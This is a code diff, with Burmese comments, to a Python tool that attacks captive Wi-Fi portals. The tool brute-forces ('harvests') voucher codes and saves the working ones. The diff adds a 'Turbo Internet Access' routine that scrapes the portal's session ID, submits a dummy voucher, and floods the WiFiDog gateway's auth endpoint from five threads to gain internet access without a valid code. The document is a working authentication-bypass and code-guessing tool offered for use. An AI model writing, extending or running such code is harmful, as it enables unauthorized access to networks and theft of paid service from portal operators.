@@ -16,7 +16,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 SUCCESS_CODES_FILE = "success.txt"
 TRIED_CODES_FILE = "tried.txt"
 VOUCHER_THREADS = 50 # Threads အရေအတွက်
-PING_INTERVAL = 1 # Ping ထိုးမည့် ကြားကာလ
+PING_INTERVAL = 0.1 # Turbo Script အတွက် မြန်နှုန်း
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -69,19 +69,15 @@ def get_session_id(session, portal_url):
     except:
         return None
 
-# --- BACKGROUND PINGER ---
-def start_background_ping(session, portal_host, sid):
-    """Session ပြတ်မသွားအောင် Background မှာ Ping ပေးခြင်း"""
-    ping_url = f"{portal_host}/api/auth/keepalive/"
-    def pinger():
-        while True:
-            try:
-                session.get(ping_url, params={'sessionId': sid}, timeout=5)
-                print(f"\r[📡 Background Ping: OK]        ", end="", flush=True)
-            except:
-                pass
-            time.sleep(PING_INTERVAL)
-    threading.Thread(target=pinger, daemon=True).start()
+# --- TURBO PINGER (YOUR SCRIPT) ---
+def high_speed_ping(auth_link, session, sid):
+    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
+    while True:
+        try:
+            res = session.get(auth_link, timeout=5)
+            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
+        except: break
+        time.sleep(PING_INTERVAL)
 
 # --- MENU 1: TEST SPECIFIC CODE ---
 def test_specific_code():
@@ -186,55 +182,62 @@ def view_success_codes():
     print("========================================")
     input("👉 Enter ကိုနှိပ်ပြီး Menu သို့ပြန်သွားပါ။")
 
-# --- MENU 5: FAST INTERNET ACCESS ---
-def fast_internet_access():
-    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
+# --- MENU 5: TURBO INTERNET ACCESS (YOUR SCRIPT) ---
+def start_turbo_internet():
+    print(f"\n[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
     
-    if not os.path.exists(SUCCESS_CODES_FILE):
-        print("❌ Success Codes များမရှိပါ။")
-        time.sleep(2)
-        return
-
-    with open(SUCCESS_CODES_FILE, "r") as f:
-        codes = [line.strip() for line in f.readlines() if line.strip()]
-        if not codes:
-            print("❌ Success Codes များမရှိပါ။")
-            time.sleep(2)
-            return
-        code = codes[-1] # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
-
-    print(f"📡 သုံးစွဲမည့် Code: {code}")
-    
-    portal_host, portal_url = get_portal_info()
-    if not portal_host:
-        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
-        return
-
-    session = requests.Session()
-    sid = get_session_id(session, portal_url)
-    
-    if not sid:
-        print("❌ Session ID ယူမရပါ။")
-        return
-    
-    voucher_api = f"{portal_host}/api/auth/voucher/"
-    
-    try:
-        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+    while True:
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
         
-        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
-            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected.\033[0m")
-            # --- PING ထိန်းထားရန် ---
-            start_background_ping(session, portal_host, sid)
-            print("📡 Internet လိုင်းကျမသွားအောင် ထိန်းထားသည်... (Ctrl+C ဖြင့် ရပ်နိုင်သည်)")
-            while True: time.sleep(1) # Script မရပ်အောင်ထားခြင်း
-        else:
-            print(f"\n❌ FAIL! Cannot connect with code.")
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
+                time.sleep(5)
+                continue
             
-    except Exception as e:
-        print(f"\n❌ Error: {e}")
-    
-    time.sleep(2)
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+            
+            # ၁။ SID ရှာဖွေခြင်း
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+            
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+            
+            if sid:
+                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
+                print(f"\n[*] Activating Session with Voucher API...")
+                voucher_api = f"{portal_host}/api/auth/voucher/"
+                try:
+                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
+                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                    print(f"[+] Voucher API Response: {v_res.status_code}")
+                except:
+                    print("[!] Voucher API Failed (Gateway might not require it)")
+
+                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                gw_port = params.get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+                print(f"[*] SID: {sid} | Starting Turbo Threads...")
+
+                for _ in range(5):
+                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
+
+                while True: time.sleep(1) # ရပ်မသွားအောင်ထားခြင်း
+
+        except Exception as e:
+            time.sleep(5)
 
 # --- MENU SYSTEM ---
 def show_menu():
@@ -258,7 +261,7 @@ def show_menu():
     print("2. 🚀 Fast Random Harvesting")
     print("3. 📋 View Success Codes")
     print("4. 🔄 Reset Data (Start Over)")
-    print("5. 🌐 Fast Internet Access")
+    print("5. 🌐 Turbo Internet Access")
     print("========================================\n")
     choice = input("👉 ရွေးချယ်ပါ (1-5): ")
     return choice
@@ -275,7 +278,7 @@ if __name__ == "__main__":
         elif choice == '4':
             reset_files()
         elif choice == '5':
-            fast_internet_access()
+            start_turbo_internet()
         else:
             print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
             time.sleep(1)
